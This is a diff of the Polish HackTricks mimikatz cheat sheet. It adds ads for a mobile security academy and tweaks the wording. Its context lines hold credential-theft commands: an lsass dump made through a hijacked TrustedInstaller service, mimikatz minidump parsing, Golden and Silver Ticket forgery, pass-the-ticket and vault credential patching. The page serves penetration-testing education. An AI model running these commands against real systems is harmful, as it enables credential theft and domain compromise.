@@ -15,6 +15,13 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
+
+
 **Ta strona opiera się na jednej z [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Sprawdź oryginał, aby uzyskać więcej informacji!
 
 ## LM i hasła w postaci czystego tekstu w pamięci
@@ -36,7 +43,7 @@ Administratorzy zazwyczaj mają SeDebugPrivilege, co umożliwia im debugowanie p
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-To pozwala na zrzut pamięci `lsass.exe` do pliku, który następnie można przeanalizować na innym systemie w celu wyodrębnienia poświadczeń:
+To pozwala na zrzut pamięci `lsass.exe` do pliku, który następnie można analizować na innym systemie w celu wyodrębnienia poświadczeń:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
@@ -86,7 +93,7 @@ Srebrne Bilety dają dostęp do konkretnych usług. Kluczowe polecenie i paramet
 
 - Polecenie: Podobne do Złotego Biletu, ale celuje w konkretne usługi.
 - Parametry:
-- `/service`: Usługa, którą należy zaatakować (np. cifs, http).
+- `/service`: Usługa, którą należy celować (np. cifs, http).
 - Inne parametry podobne do Złotego Biletu.
 
 Przykład:
@@ -112,17 +119,17 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Polecenie: `kerberos::list`
 - Wyświetla wszystkie bilety Kerberos dla bieżącej sesji użytkownika.
 
-- **Przekaż pamięć podręczną**:
+- **Przekazywanie pamięci podręcznej**:
 - Polecenie: `kerberos::ptc`
 - Wstrzykuje bilety Kerberos z plików pamięci podręcznej.
 - Przykład: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **Przekaż bilet**:
+- **Przekazywanie biletu**:
 - Polecenie: `kerberos::ptt`
 - Umożliwia użycie biletu Kerberos w innej sesji.
 - Przykład: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Wyczyść bilety**:
+- **Usuwanie biletów**:
 - Polecenie: `kerberos::purge`
 - Czyści wszystkie bilety Kerberos z sesji.
 - Przydatne przed użyciem poleceń manipulacji biletami, aby uniknąć konfliktów.
@@ -200,6 +207,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "vault::cred /patch" exit`
 
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Zgłębiaj swoją wiedzę w **Bezpieczeństwie Mobilnym** z 8kSec Academy. Opanuj bezpieczeństwo iOS i Androida dzięki naszym kursom w trybie samodzielnym i uzyskaj certyfikat:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
 Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
@@ -210,7 +223,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Dziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
+* **Dziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 {% endhint %}
